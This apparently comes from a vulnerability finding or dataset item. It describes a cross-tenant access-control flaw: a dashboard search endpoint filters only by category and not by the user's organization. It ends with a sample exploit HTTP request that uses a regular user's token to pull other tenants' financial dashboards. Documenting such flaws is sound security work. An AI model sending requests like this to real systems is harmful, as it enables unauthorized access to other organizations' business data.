diagnosis: The dashboard discovery endpoint queries Redis OM using AnalyticsDashboard.find() filtering solely by category. It does not scope the search expression to current_user.organization_id, returning business intelligence dashboard layouts across all tenant organizations.
exploit_request:
GET /reporting/dashboards/find?category=executive_financials HTTP/1.1
Host: bi.cloudanalytics.net
Authorization: Bearer <regular_user_token>
